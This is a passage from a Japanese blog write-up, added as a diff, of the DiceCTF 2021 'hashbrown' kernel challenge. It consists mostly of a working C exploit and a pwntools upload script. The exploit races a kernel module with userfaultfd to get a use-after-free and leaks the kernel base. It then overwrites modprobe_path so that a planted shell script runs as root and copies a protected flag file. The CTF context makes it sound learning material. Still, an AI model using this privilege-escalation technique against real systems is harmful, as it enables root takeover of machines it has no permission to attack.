+    printf(&quot;[+] uffdio_copy.src: %p\n&quot;, faultsrc);
+    uffdio_copy.src = (ulong)faultsrc;
+    uffdio_copy.dst = (ulong)msg.arg.pagefault.address &amp; ~(PAGE - 1);
+    uffdio_copy.len = PAGE;
+    uffdio_copy.mode = 0;
+    uffdio_copy.copy = 0;
+    if(ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == -1)
+      errExit(&quot;ioctl-UFFDIO_COPY&quot;);
+    else{
+      puts(&quot;[+] end ioctl(UFFDIO_COPY)&quot;);
+    }
+
+    break;
+  }
+
+  puts(&quot;[+] exiting fault_handler_thrd&quot;);
+}
+
+pthread_t register_userfaultfd_and_halt(void)
+{
+  puts(&quot;[+] registering userfaultfd...&quot;);
+
+  long uffd;      // userfaultfd file descriptor
+  struct uffdio_api uffdio_api;
+  struct uffdio_register uffdio_register;
+  int s;
+
+  // create userfaultfd file descriptor
+  uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK); // there is no wrapper in libc
+  if(uffd == -1)
+    errExit(&quot;userfaultfd&quot;);
+
+  // enable uffd object via ioctl(UFFDIO_API)
+  uffdio_api.api = UFFD_API;
+  uffdio_api.features = 0;
+  if(ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == -1)
+    errExit(&quot;ioctl-UFFDIO_API&quot;);
+
+  // mmap
+  puts(&quot;[+] mmapping...&quot;);
+  uffdaddr = mmap((void*)FAULT_ADDR, PAGE, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS | MAP_FIXED, -1, 0); // set MAP_FIXED for memory to be mmaped on exactly specified addr.
+  printf(&quot;[+] mmapped @ %p\n&quot;, uffdaddr);
+  if(uffdaddr == MAP_FAILED)
+    errExit(&quot;mmap&quot;);
+
+  // specify memory region handled by userfaultfd via ioctl(UFFDIO_REGISTER)
+  uffdio_register.range.start = (ulong)uffdaddr;
+  uffdio_register.range.len = PAGE;
+  uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;
+  if(ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == -1)
+    errExit(&quot;ioctl-UFFDIO_REGISTER&quot;);
+
+  s = pthread_create(&amp;uffdthr, NULL, fault_handler_thread, (void*)uffd);
+  if(s!=0){
+    errno = s;
+    errExit(&quot;pthread_create&quot;);
+  }
+
+  puts(&quot;[+] registered userfaultfd&quot;);
+  return uffdthr;
+}
+// (END userfaultfd-utils)
+
+/******** MAIN ******************/
+
+int main(int argc, char *argv[]) {
+  char buf[0x200];
+  faultsrc = mmap(0, PAGE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+  memset(buf, 0, 0x200);
+  hashfd = open(DEV_PATH, O_RDONLY);
+  assert(hashfd &gt; 0);
+
+  // race-1: leak via shm_file_data
+  for(int ix=0; ix!=threshold; ++ix){
+    add_key(hashfd, ix, 0x20, buf);
+  }
+  register_userfaultfd_and_halt();
+  add_key(hashfd, threshold, 0x20, uffdaddr);
+  limit &lt;&lt;= 2;
+  threshold = limit * 3 / 4;
+  pthread_join(uffdthr, 0);
+
+  // leak kernbase
+  get_value(hashfd, targetkey, 0x20, buf);
+  printf(&quot;[!] %lx\n&quot;, ((ulong*)buf)[0]);
+  printf(&quot;[!] %lx\n&quot;, ((ulong*)buf)[1]);
+  printf(&quot;[!] %lx\n&quot;, ((ulong*)buf)[2]);
+  printf(&quot;[!] %lx: shmem_vm_ops\n&quot;, ((ulong*)buf)[3]);
+  const ulong shmem_vm_ops = ((ulong*)buf)[3];
+  const ulong kernbase = shmem_vm_ops - ((ulong)0xffffffff8b622b80 - (ulong)0xffffffff8ae00000);
+  const ulong modprobe_path = kernbase + ((ulong)0xffffffffb0c46fe0 - (ulong)0xffffffffb0200000);
+  printf(&quot;[!] kernbase: 0x%lx\n&quot;, kernbase);
+  printf(&quot;[!] modprobe_path: 0x%lx\n&quot;, modprobe_path);
+
+  // race-2: retrieve hash_entry as value
+  targetkey = threshold - 1;
+  memset(buf, &#x27;A&#x27;, 0x20);
+  for(int ix=SIZE_ARR_START * 3/4 + 1; ix!=threshold; ++ix){
+    add_key(hashfd, ix, 0x20, buf);
+  }
+  register_userfaultfd_and_halt();
+  add_key(hashfd, threshold, 0x20, uffdaddr);
+  pthread_join(uffdthr, 0);
+  for(int ix=threshold+1; 1==1; ++ix){ // find my cute object
+    memset(buf, &#x27;A&#x27;, 0x20);
+    add_key(hashfd, ix, 0x20, buf);
+    get_value(hashfd, targetkey, 0x20, buf);
+    if(((uint*)buf)[0] != 0x41414141){
+      printf(&quot;[!] GOT kUAFed object!\n&quot;);;
+      printf(&quot;[!] %lx\n&quot;, ((ulong*)buf)[0]);
+      printf(&quot;[!] %lx\n&quot;, ((ulong*)buf)[1]);
+      printf(&quot;[!] %lx\n&quot;, ((ulong*)buf)[2]);
+      printf(&quot;[!] %lx\n&quot;, ((ulong*)buf)[3]);
+      break;
+    }
+  }
+
+  // forge hash_entry as data and overwrite modprobe_path
+  struct hash_entry victim = {
+    .key = ((uint*)buf)[0],
+    .size = ((uint*)buf)[1],
+    .value = modprobe_path,
+    .next = NULL
+  };
+  update_value(hashfd, targetkey, 0x20, &amp;victim);
+  update_value(hashfd, ((uint*)buf)[0], 0x20, &quot;/home/ctf/nirugiri.sh\x00\x00\x00\x00&quot;);
+
+  // trigger modprobe_path
+  system(&quot;echo -ne &#x27;#!/bin/sh\n/bin/cp /flag.txt /home/ctf/flag.txt\n/bin/chmod 777 /home/ctf/flag.txt&#x27; &gt; /home/ctf/nirugiri.sh&quot;);
+  system(&quot;chmod +x /home/ctf/nirugiri.sh&quot;);
+  system(&quot;echo -ne &#x27;\\xff\\xff\\xff\\xff&#x27; &gt; /home/ctf/puipui-molcar&quot;);
+  system(&quot;chmod +x /home/ctf/puipui-molcar&quot;);
+  system(&quot;/home/ctf/puipui-molcar&quot;);
+
+  // NIRUGIRI it
+  system(&quot;cat /home/ctf/flag.txt&quot;);
+
+  return 0;
+}
+</pre>
+<p></p>
+<p>今回はまだ問題サーバが生きていたからsenderも。</p>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">sender.py</div>
+<pre class="prettyprint linenums lang-py">
+#!/usr/bin/env python
+#encoding: utf-8;
+
+from pwn import *
+import sys
+
+FILENAME = &quot;./exploit&quot;
+LIBCNAME = &quot;&quot;
+
+hosts = (&quot;dicec.tf&quot;,&quot;localhost&quot;,&quot;localhost&quot;)
+ports = (31691,12300,23947)
+rhp1 = {&#x27;host&#x27;:hosts[0],&#x27;port&#x27;:ports[0]}    #for actual server
+rhp2 = {&#x27;host&#x27;:hosts[1],&#x27;port&#x27;:ports[1]}    #for localhost 
+rhp3 = {&#x27;host&#x27;:hosts[2],&#x27;port&#x27;:ports[2]}    #for localhost running on docker
+context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;)
+binf = ELF(FILENAME)
+libc = ELF(LIBCNAME) if LIBCNAME!=&quot;&quot; else None
+
+
+## utilities #########################################
+
+def hoge():
+  global c
+  pass
+
+## exploit ###########################################
+
+def exploit():
+  c.recvuntil(&quot;Send the output of: &quot;)
+  hashcat = c.recvline().rstrip().decode(&#x27;utf-8&#x27;)
+  print(&quot;[+] calculating PoW...&quot;)
+  hash_res = os.popen(hashcat).read()
+  print(&quot;[+] finished calc hash: &quot; + hash_res)
+  c.sendline(hash_res)
+
+  with open(&quot;./exploit.b64&quot;, &#x27;r&#x27;) as f:
+    binary = f.read()
+  
+  progress = 0
+  print(&quot;[+] sending base64ed exploit (total: {})...&quot;.format(hex(len(binary))))
+  for s in [binary[i: i+0x80] for i in range(0, len(binary), 0x80)]:
+    c.sendlineafter(&#x27;$&#x27;, &#x27;echo {} &gt;&gt; exploit.b64&#x27;.format(s))
+    progress += 0x80
+    if progress % 0x1000 == 0:
+      print(&quot;[.] sent {} bytes [{} %]&quot;.format(hex(progress), float(progress)*100.0/float(len(binary))))
+  c.sendlineafter(&#x27;$&#x27;, &#x27;base64 -d exploit.b64 &gt; exploit&#x27;)
+
+
+
+## main ##############################################
+
+if __name__ == &quot;__main__&quot;:
+    global c
+    
+    if len(sys.argv)&gt;1:
+      if sys.argv[1][0]==&quot;d&quot;:
+        cmd = &quot;&quot;&quot;
+          set follow-fork-mode parent
+        &quot;&quot;&quot;
+        c = gdb.debug(FILENAME,cmd)
+      elif sys.argv[1][0]==&quot;r&quot;:
+        c = remote(rhp1[&quot;host&quot;],rhp1[&quot;port&quot;])
+      elif sys.argv[1][0]==&quot;v&quot;:
+        c = remote(rhp3[&quot;host&quot;],rhp3[&quot;port&quot;])
+    else:
+        c = remote(rhp2[&#x27;host&#x27;],rhp2[&#x27;port&#x27;])
+    exploit()
+    c.interactive()
+</pre>
+<p></p>
+<h3>10: アウトロ</h3>
+<p></p>
+<p></p>
+<p></p>
+<p>いい問題。大切な要素が詰まってるし、難易度も簡単すぎず難しすぎず。</p>
+<p>おいしかったです。やよい軒行ってきます。</p>
+<p></p>
+<h3>11: symbols without KASLR</h3>
+
+<div style="margin-bottom:0; padding-bottom:0; display:inline; font-size:80%; background-color:#3d3939;">symbols.txt</div>
+<pre class="prettyprint linenums lang-txt">
+hashmap: 0xffffffffc0002540
+kmalloc_caches: 0xffffffff81981dc0
+__per_cpu_offset: 0xffffffff81980680
+</pre>
+<p>FGKASLRのせいでモジュール内の関数にブレーク貼れないのマジでストレスで胃が爆発霧散するかと思った(<code>nokaslr</code>指定しても無駄だし... :cry:)。まぁ起動する度に確認すれば良いんだけど。</p>
+<p></p>
+<p></p>
+<h3>12: 参考</h3>
+<p>1: author&#x27;s writeup</p>
+<p><a href='https://www.willsroot.io/2021/02/dicectf-2021-hashbrown-writeup-from.html'>https://www.willsroot.io/2021/02/dicectf-2021-hashbrown-writeup-from.html</a></p>
+<p>2: LWN about FGKASLR</p>
+<p><a href='https://lwn.net/Articles/824307/'>https://lwn.net/Articles/824307/</a></p>
+<p>3: pwn chall in HXPCTF also using FGKASLR</p>
+<p><a href='https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/'>https://hxp.io/blog/81/hxp-CTF-2020-kernel-rop/</a></p>
+<p>4: kernel structure refs</p>
+<p><a href='https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628'>https://ptr-yudai.hatenablog.com/entry/2020/03/16/165628</a></p>
+<p>5: しふくろさんのブログ(modprobe_pathについて参考にした)</p>
+<p><a href='https://shift-crops.hatenablog.com/entry/2019/04/30/131154'>https://shift-crops.hatenablog.com/entry/2019/04/30/131154</a></p>
+<p>6: ニルギリ</p>
+<p><a href='https://youtu.be/yvUvamhYPHw'>https://youtu.be/yvUvamhYPHw</a></p>
+
+<p></p><p></p>
+<p></p><p></p>
+<p>続く...</p>
+<p></p><p></p>
